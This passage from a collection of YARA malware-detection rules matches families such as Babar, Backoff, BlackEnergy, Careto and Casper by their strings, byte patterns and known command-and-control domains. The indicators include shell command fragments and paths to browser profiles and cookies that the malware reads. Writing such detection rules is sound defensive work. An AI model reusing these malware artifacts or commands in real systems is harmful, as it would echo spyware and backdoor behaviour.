\"http://motherboard.vice.com/read/meet-babar-a-new-malware-almost-certainly-created-by-france\"\n        classifications = \"Keylogger, Spyware\"\n        threat_names = \"Babar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"SNOWGLOBE_Babar_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $z0 = \"admin\\\\Desktop\\\\Babar64\\\\Babar64\\\\obj\\\\DllWrapper\" ascii fullword\n        $z1 = \"User-Agent: Mozilla/4.0 (compatible; MSI 6.0;\" ascii fullword\n        $z2 = \"ExecQueryFailled!\" fullword ascii\n        $z3 = \"NBOT_COMMAND_LINE\" fullword\n        $z4 = \"!!!EXTRACT ERROR!!!File Does Not Exists-->[%s]\" fullword\n        $s1 = \"/s /n %s \\\"%s\\\"\" fullword ascii\n        $s2 = \"%%WINDIR%%\\\\%s\\\\%s\" fullword ascii\n        $s3 = \"/c start /wait \" fullword ascii\n        $s4 = \"(D;OICI;FA;;;AN)(A;OICI;FA;;;BG)(A;OICI;FA;;;SY)(A;OICI;FA;;;LS)\" ascii\n        $x1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\\" fullword ascii\n        $x2 = \"%COMMON_APPDATA%\" fullword ascii\n        $x4 = \"CONOUT$\" fullword ascii\n        $x5 = \"cmd.exe\" fullword ascii\n        $x6 = \"DLLPATH\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1MB and ((1 of ($z*) and 1 of ($x*)) or (3 of ($s*) and 4 of ($x*)))\n}\n\nrule backoff\n{\n    meta:\n        description = \"Backoff POS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"Backoff\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"backoff\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"&op=%d&id=%s&ui=%s&wv=%d&gr=%s&bv=%s\"\n        $s2 = \"%s @ %s\"\n        $s3 = \"Upload KeyLogs\"\n\n    condition:\n        all of them\n}\n\nprivate rule BangatCode\n{\n    meta:\n        description = \"Bangat code features\"\n        classifications = \"Backdoor, Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"BangatCode\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = { FE 4D ?? 8D 4? ?? 50 5? FF }\n\n    condition:\n        any of them\n}\n\nprivate rule BangatStrings\n{\n    meta:\n        description = \"Bangat Identifying Strings\"\n        classifications = \"Backdoor, Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"BangatStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $lib1 = \"DreatePipe\"\n        $lib2 = \"HetSystemDirectoryA\"\n        $lib3 = \"SeleaseMutex\"\n        $lib4 = \"DloseWindowStation\"\n        $lib5 = \"DontrolService\"\n        $file = \"~hhC2F~.tmp\"\n        $mc = \"~_MC_3~\"\n\n    condition:\n        all of ($lib*) or $file or $mc\n}\n\nrule Bangat\n{\n    meta:\n        description = \"Bangat backdoor\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"Bangat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"Bangat\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        BangatCode or BangatStrings\n}\n\nrule Batel_export_function\n{\n    meta:\n        description = \"Batel backdoor\"\n        ref = \"https://www.symantec.com/security_response/writeup.jsp?docid=2016-091923-4146-99\"\n        classifications = \"Backdoor\"\n        threat_names = \"Batel\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@j0sm1\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Batel_export_function\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    condition:\n        pe.exports(\"run_shell\") and pe.imports(\"kernel32.dll\" , \"GetTickCount\") and pe.imports(\"kernel32.dll\" , \"IsDebuggerPresent\") and pe.imports(\"msvcr100.dll\" , \"_crt_debugger_hook\") and pe.imports(\"kernel32.dll\" , \"TerminateProcess\") and pe.imports(\"kernel32.dll\" , \"UnhandledExceptionFilter\")\n}\n\nrule BernhardPOS\n{\n    meta:\n        description = \"BernhardPOS credit card dumping tool\"\n        ref = \"http://morphick.com/blog/2015/7/14/bernhardpos-new-pos-malware-discovered-by-morphick\"\n        classifications = \"Spyware\"\n        threat_names = \"BernhardPOS\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Nick Hoffman / Jeremy Humble\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BernhardPOS\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $shellcode_kernel32_with_junk_code = { 33 c0 83 ?? ?? 83 ?? ?? 64 a1 30 00 00 00 83 ?? ?? 83 ?? ?? 8b 40 0c 83 ?? ?? 83 ?? ?? 8b 40 14 83 ?? ?? 83 ?? ?? 8b 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 8b 00 83 ?? ?? 83 ?? ?? 8b 40 10 83 ?? ?? }\n        $mutex_name = \"OPSEC_BERNHARD\"\n        $build_path = \"C:\\\\bernhard\\\\Debug\\\\bernhard.pdb\"\n        $string_decode_routine = { 55 8b ec 83 ec 50 53 56 57 a1 ?? ?? ?? ?? 89 45 f8 66 8b 0d ?? ?? ?? ?? 66 89 4d fc 8a 15 ?? ?? ?? ?? 88 55 fe 8d 45 f8 50 ff ?? ?? ?? ?? ?? 89 45 f0 c7 45 f4 00 00 00 00 ?? ?? 8b 45 f4 83 c0 01 89 45 f4 8b 45 08 50 ff ?? ?? ?? ?? ?? 39 45 f4 ?? ?? 8b 45 08 03 45 f4 0f be 08 8b 45 f4 99 f7 7d f0 0f be 54 15 f8 33 ca 8b 45 08 03 45 f4 88 08 ?? ?? 5f 5e 5b 8b e5 5d }\n\n    condition:\n        any of them\n}\n\nrule APT_bestia\n{\n    meta:\n        description = \"Bestia malware; used in APT attacks on Polish government\"\n        threat_names = \"Bestia\"\n        ref = \"http://zaufanatrzeciastrona.pl/post/ukierunkowany-atak-na-pracownikow-polskich-samorzadow/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Adam Ziaja <adam@adamziaja.com> http://adamziaja.com\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_bestia\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string0 = \"u4(UeK\"\n        $string1 = \"nMiq/'p\"\n        $string2 = \"_9pJMf\"\n        $string3 = \"ICMP.DLL\"\n        $string4 = \"EG}QAp\"\n        $string5 = \"tsjWj:U\"\n        $string6 = \"FileVersion\" wide\n        $string7 = \"O2nQpp\"\n        $string8 = \"2}W8we\"\n        $string9 = \"ILqkC:l\"\n        $string10 = \"f1yzMk\"\n        $string11 = \"AutoIt v3 Script: 3, 3, 8, 1\" wide\n        $string12 = \"wj<1uH\"\n        $string13 = \"6fL-uD\"\n        $string14 = \"B9Iavo<\"\n        $string15 = \"rUS)sO\"\n        $string16 = \"FJH{_/f\"\n        $string17 = \"3e 03V\"\n\n    condition:\n        17 of them\n}\n\nrule BlackRev\n{\n    meta:\n        description = \"Black Revolution DDoS malware.\"\n        ref = \"http://www.arbornetworks.com/asert/2013/05/the-revolution-will-be-written-in-delphi/\"\n        classifications = \"Bot\"\n        threat_names = \"Black Revolution\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dennis Schwarz\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"BlackRev\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $base1 = \"http\"\n        $base2 = \"simple\"\n        $base3 = \"loginpost\"\n        $base4 = \"datapost\"\n        $opt1 = \"blackrev\"\n        $opt2 = \"stop\"\n        $opt3 = \"die\"\n        $opt4 = \"sleep\"\n        $opt5 = \"syn\"\n        $opt6 = \"udp\"\n        $opt7 = \"udpdata\"\n        $opt8 = \"icmp\"\n        $opt9 = \"antiddos\"\n        $opt10 = \"range\"\n        $opt11 = \"fastddos\"\n        $opt12 = \"slowhttp\"\n        $opt13 = \"allhttp\"\n        $opt14 = \"tcpdata\"\n        $opt15 = \"dataget\"\n\n    condition:\n        all of ($base*) and 5 of ($opt*)\n}\n\nrule BlackEnergy_BE_2\n{\n    meta:\n        description = \"BlackEnergy 2 Malware\"\n        ref = \"http://goo.gl/DThzLz\"\n        classifications = \"Trojan\"\n        threat_names = \"BlackEnergy 2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"BlackEnergy_BE_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"<description> Windows system utility service  </description>\" fullword ascii\n        $s1 = \"WindowsSysUtility - Unicode\" fullword wide\n        $s2 = \"msiexec.exe\" fullword wide\n        $s3 = \"WinHelpW\" fullword ascii\n        $s4 = \"ReadProcessMemory\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and all of ($s*)\n}\n\nrule blackenergy3_installer\n{\n    meta:\n        description = \"BlackEnergy 3 malware installer\"\n        ref = \"https://www.f-secure.com/documents/996508/1030745/blackenergy_whitepaper.pdf\"\n        classifications = \"Trojan\"\n        threat_names = \"BlackEnergy 3\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Mike Schladt\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"blackenergy3_installer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $import_names = { C7 45 D0 75 73 65 72 C7 45 D4 33 32 2E 64 66 C7 45 D8 6C 6C 88 5D DA C7 45 84 61 64 76 61 C7 45 88 70 69 33 32 C7 45 8C 2E 64 6C 6C 88 5D 90 C7 45 B8 77 69 6E 69 C7 45 BC 6E 65 74 2E C7 45 C0 64 6C 6C 00 C7 45 C4 77 73 32 5F C7 45 C8 33 32 2E 64 66 C7 45 CC 6C 6C 88 5D CE C7 45 94 73 68 65 6C C7 45 98 6C 33 32 2E C7 45 9C 64 6C 6C 00 C7 45 E8 70 73 61 70 C7 45 EC 69 2E 64 6C 66 C7 45 F0 6C 00 C7 85 74 FF FF FF 6E 65 74 61 C7 85 78 FF FF FF 70 69 33 32 C7 85 7C FF FF FF 2E 64 6C 6C 88 5D 80 C7 85 64 FF FF FF 6F 6C 65 61 C7 85 68 FF FF FF 75 74 33 32 C7 85 6C FF FF FF 2E 64 6C 6C 88 9D 70 FF FF FF C7 45 DC 6F 6C 65 33 C7 45 E0 32 2E 64 6C 66 C7 45 E4 6C 00 C7 45 A0 76 65 72 73 C7 45 A4 69 6F 6E 2E C7 45 A8 64 6C 6C 00 C7 85 54 FF FF FF 69 6D 61 67 C7 85 58 FF FF FF 65 68 6C 70 C7 85 5C FF FF FF 2E 64 6C 6C 88 9D 60 FF FF FF C7 45 AC 61 70 70 68 C7 45 B0 65 6C 70 2E C7 45 B4 64 6C 6C 00 C7 45 F4 2E 64 6C 6C 88 5D F8 }\n\n    condition:\n        any of them\n}\n\nrule BlackWorm\n{\n    meta:\n        description = \"BlackWorm\"\n        classifications = \"Worm\"\n        threat_names = \"BlackWorm\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"BlackWorm\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $str1 = \"m_ComputerObjectProvider\"\n        $str2 = \"MyWebServices\"\n        $str3 = \"get_ExecutablePath\"\n        $str4 = \"get_WebServices\"\n        $str5 = \"My.WebServices\"\n        $str6 = \"My.User\"\n        $str7 = \"m_UserObjectProvider\"\n        $str8 = \"DelegateCallback\"\n        $str9 = \"TargetMethod\"\n        $str10 = \"000004b0\" wide\n        $str11 = \"Microsoft Corporation\" wide\n\n    condition:\n        all of them\n}\n\nrule BrushaLoaderVBScript\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"BrushaLoader\"\n        classifications = \"Downloader\"\n        threat_names = \"BrushaLoader\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n\n    strings:\n        $obfus1 = \"nacci(N)\"\n        $obfus2 = \"MSGBOX\" nocase\n        $vbs1 = \"End Sub\" nocase\n        $vbs2 = \"Function \" nocase\n        $vbs3 = \"End Function\" nocase\n        $connect01 = \"Microsoft\" nocase\n        $connect02 = \"XMLHTTP\" nocase\n        $connect03 = \"\\\"Post\\\"\" nocase\n        $connect05 = \".responseText\" nocase\n        $connect06 = \"CreateObject\" nocase\n        $connect07 = \".Open \" nocase\n        $connect08 = \".Close \" nocase\n\n    condition:\n        // Right size\n        filesize > 1KB and filesize < 10KB\n        // Brushaloader's obfuscation\n        and (\n            // starts with a single-quote string\n            uint8(0) == 0x27\n            // has the obfuscation function\n            and 1 of ($obfus*)\n        )\n        // Connects home the right way\n        and 6 of ($connect*)\n        // Is a VBScript\n        and all of ($vbs*)\n}\n\nrule BrushaLoaderFingerPrinting\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"BrushaLoader Fingerprinting Module\"\n        classifications = \"Downloader\"\n        threat_names = \"BrushaLoader\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n\n    strings:\n        $disk1 = \"Win32_Volume\" nocase\n        $disk2 = \"SerialNumber\" nocase\n        $os = \"OSVersion\" nocase\n        $user1 = \"WindowsIdentity\" nocase\n        $user2 = \"[Environment]::UserName\" nocase\n        $manufacturer = \"Win32_ComputerSystem\" nocase\n        $syslang = \"CurrentCulture\" nocase\n        $arch = \"PROCESSOR_ARCHITECTURE\" nocase\n        $psversion = \"$PSVersionTable\" nocase\n        $memory = \"TotalPhysicalMemory\" nocase\n        $ipaddress = \"ipconfig\" nocase\n        $pwdpath = \"(pwd).Path\" nocase\n        $installdate = \"InstallDate\" nocase\n        $videocontroller = \"Win32_VideoController\" nocase\n\n    condition:\n        12 of them\n}\n\nrule Bublik\n{\n    meta:\n        description = \"Bublik spyware\"\n        classifications = \"Trojan, Downloader, Spyware\"\n        threat_names = \"Bublik\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Falcoz\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Bublik\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $signature1 = {63 6F 6E 73 6F 6C 61 73}\n        $signature2 = {63 6C 55 6E 00 69 6E 66 6F 2E 69 6E 69}\n\n    condition:\n        $signature1 and $signature2\n}\n\nrule generic_carbon\n{\n    meta:\n        description = \"Carbon backdoor\"\n        ref = \"https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Carbon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"ESET Research\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"generic_carbon\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ModStart\"\n        $t1 = \"STOP|OK\"\n        $t2 = \"STOP|KILL\"\n\n    condition:\n        (uint16(0) == 0x5a4d) and (1 of ($s*)) and (1 of ($t*))\n}\n\nrule carbon_metadata\n{\n    meta:\n        description = \"Carbon backdoor\"\n        ref = \"https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Carbon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"ESET Research\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"carbon_metadata\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        (pe.version_info[\"InternalName\"] contains \"SERVICE.EXE\" or pe.version_info[\"InternalName\"] contains \"MSIMGHLP.DLL\" or pe.version_info[\"InternalName\"] contains \"MSXIML.DLL\") and pe.version_info[\"CompanyName\"] contains \"Microsoft Corporation\"\n}\n\nrule Careto_SGH\n{\n    meta:\n        description = \"Careto / The Mask espionage malware SGH backdoor\"\n        ref = \"www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf\"\n        classifications = \"Backdoor, Rootkit\"\n        threat_names = \"Careto, Mask\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"AlienVault (Alberto Ortega)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Careto_SGH\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $m1 = \"PGPsdkDriver\" ascii wide fullword\n        $m2 = \"jpeg1x32\" ascii wide fullword\n        $m3 = \"SkypeIE6Plugin\" ascii wide fullword\n        $m4 = \"CDllUninstall\" ascii wide fullword\n\n    condition:\n        2 of them\n}\n\nrule Careto_OSX_SBD\n{\n    meta:\n        description = \"Careto / The Mask espionage malware OSX component\"\n        ref = \"www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf\"\n        classifications = \"Backdoor, Rootkit\"\n        threat_names = \"Careto, Mask\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"AlienVault (Alberto Ortega)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Careto_OSX_SBD\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $1 = {FF 16 64 0A 7E 1A 63 4D 21 4D 3E 1E 60 0F 7C 1A 65 0F 74 0B 3E 1C 7F 12}\n\n    condition:\n        all of them\n}\n\nrule Careto_CnC\n{\n    meta:\n        description = \"Careto / The Mask espionage malware C&C communication\"\n        ref = \"www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf\"\n        classifications = \"Backdoor, Rootkit\"\n        threat_names = \"Careto, Mask\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"AlienVault (Alberto Ortega)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Careto_CnC\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $1 = \"cgi-bin/commcgi.cgi\" ascii wide\n        $2 = \"Group\" ascii wide\n        $3 = \"Install\" ascii wide\n        $4 = \"Bn\" ascii wide\n\n    condition:\n        all of them\n}\n\nrule Careto_CnC_domains\n{\n    meta:\n        description = \"Careto / The Mask espionage malware C&C domains\"\n        ref = \"www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf\"\n        classifications = \"Backdoor, Rootkit\"\n        threat_names = \"Careto, Mask\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"AlienVault (Alberto Ortega)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Careto_CnC_domains\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $1 = \"linkconf.net\" ascii wide nocase\n        $2 = \"redirserver.net\" ascii wide nocase\n        $3 = \"swupdt.com\" ascii wide nocase\n\n    condition:\n        any of them\n}\n\nrule Casper_Backdoor_x86\n{\n    meta:\n        description = \"Casper espionage malware x86 Payload\"\n        ref = \"http://goo.gl/VRJNLo\"\n        classifications = \"Backdoor\"\n        threat_names = \"Casper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Casper_Backdoor_x86\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\"svchost.exe\\\"\" fullword wide\n        $s2 = \"firefox.exe\" fullword ascii\n        $s3 = \"\\\"Host Process for Windows Services\\\"\" fullword wide\n        $x1 = \"\\\\Users\\\\*\" fullword ascii\n        $x2 = \"\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*\" fullword ascii\n        $x3 = \"\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*\" fullword ascii\n        $x4 = \"\\\\Documents and Settings\\\\*\" fullword ascii\n        $y1 = \"%s; %S=%S\" fullword wide\n        $y2 = \"%s; %s=%s\" fullword ascii\n        $y3 = \"Cookie: %s=%s\" fullword ascii\n        $y4 = \"http://%S:%d\" fullword wide\n        $z1 = \"http://google.com/\" fullword ascii\n        $z2 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)\" fullword ascii\n        $z3 = \"Operating System\\\"\" fullword wide\n\n    condition:\n        (all of ($s*)) or (3 of ($x*) and 2 of ($y*) and 2 of ($z*))\n}\n\nrule Casper_EXE_Dropper\n{\n    meta:\n        description = \"Casper espionage malware dropper\"\n        ref = \"http://goo.gl/VRJNLo\"\n        classifications = \"Backdoor\"\n        threat_names = \"Casper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Casper_EXE_Dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"<Command>\" fullword ascii\n        $s1 = \"</Command>\" fullword ascii\n        $s2 = \"\\\" /d \\\"\" fullword ascii\n        $s4 = \"'%s' %s\" fullword ascii\n        $s5 = \"nKERNEL32.DLL\" fullword wide\n        $s6 = \"@ReturnValue\" fullword wide\n        $s7 = \"ID: 0x%x\" fullword ascii\n        $s8 = \"Name: %S\" fullword ascii\n\n    condition:\n        7 of them\n}\n\nrule Casper_Included_Strings\n{\n    meta:\n        description = \"Casper espionage malware\"\n        ref = \"http://goo.gl/VRJNLo\"\n        classifications = \"Backdoor\"\n        threat_names = \"Casper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Casper_Included_Strings\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a0 = \"cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST\"\n        $a1 = \"& SYSTEMINFO) ELSE EXIT\"\n        $c1 = \"domcommon.exe\" wide fullword\n        $c2 = \"jpic.gov.sy\" fullword\n        $c3 = \"aiomgr.exe\" wide fullword\n        $c4 = \"perfaudio.dat\" fullword\n        $c5 = \"Casper_DLL.dll\" fullword\n        $c6 = { 7B 4B 59 DE 37 4A 42 26 59 98 63 C6 2D 0F 57 40 }\n        $c7 = \"{4216567A-4512-9825-7745F856}\" fullword\n\n    condition:\n        all of ($a*) or uint16(0) == 0x5a4d and (1 of ($c*))\n}\n\nrule Casper_SystemInformation_Output\n{\n    meta:\n        description = \"Casper espionage malware system info output\"\n        ref = \"http://goo.gl/VRJNLo\"\n        classifications = \"Backdoor\"\n        threat_names = \"Casper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Casper_SystemInformation_Output\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a0 = \"***** SYSTEM INFORMATION ******\"\n        $a1 = \"***** SECURITY INFORMATION ******\"\n        $a2 = \"Antivirus: \"\n        $a3 = \"Firewall: \"\n        $a4 = \"***** EXECUTION CONTEXT ******\"\n        $a5 = \"Identity: \"\n        $a6 = \"<CONFIG TIMESTAMP=\"\n\n    condition:\n        all of them\n}\n\nrule ChickenDOS\n{\n    meta:\n        description = \"Chinese Chicken bot (win32)\"\n        classifications = \"Bot\"\n        threat_names = \"Chinese Chicken\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"ChickenDOS\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $pdb1 = \"\\\\Chicken\\\\Release\\\\svchost.pdb\"\n        $pdb2 = \"\\\\IntergrateCHK\\\\Release\\\\IntergrateCHK.pdb\"\n        $str2 = \"fake.cf\"\n        $str3 = \"8.8.8.8\"\n        $str4 = \"Processor(%d)\\\\\"\n        $str5 = \"DbProtectSupport\"\n        $str1 = \"dm1712/`jvpnpkte/bpl\"\n        $str6 = \"InstallService NPF %d\"\n        $str7 = \"68961\"\n        $str8 = \"InstallService DbProtectSupport %d\"\n        $str9 = \"C:\\\\Program Files\\\\DbProtectSupport\\\\npf.sys\"\n\n    condition:\n        ($pdb1 or $pdb2) and 5 of ($str*)\n}\n\nrule ChickenDOS_Linux\n{\n    meta:\n        description = \"Chinese Chicken bot (Linux)\"\n        classifications = \"Bot\"\n        threat_names = \"Chinese Chicken\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"ChickenDOS_Linux\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $cfg = \"fake.cfg\"\n        $file1 = \"ThreadAttack.cpp\"\n        $file2 = \"Fake.cpp\"\n        $str1 = \"dns_array\"\n        $str2 = \"DomainRandEx\"\n        $str3 = \"cpu %llu %llu %llu %llu\"\n        $str4 = \"[ %02d.%02d %02d:%02d:%02d.%03ld ] [%lu] [%s] %s\" ascii\n\n    condition:\n        $cfg and all of ($file*) and 3 of ($str*)\n}\n\nrule Keylogger_CN_APT\n{\n    meta:\n        description = \"Chinese keylogger\"\n        classifications = \"Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Keylogger_CN_APT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Mozilla/4.0 (compatible; MSIE6.0;Windows NT 5.1)\" fullword ascii\n        $x2 = \"attrib -s -h -r c:\\\\ntldr\" fullword ascii\n        $x3 = \"%sWindows NT %d.%d\" fullword ascii\n        $x4 = \"Referer: http://%s/%s.aspx?n=\" fullword ascii\n        $s1 = \"\\\\cmd.exe /c \\\"systeminfo.exe >> 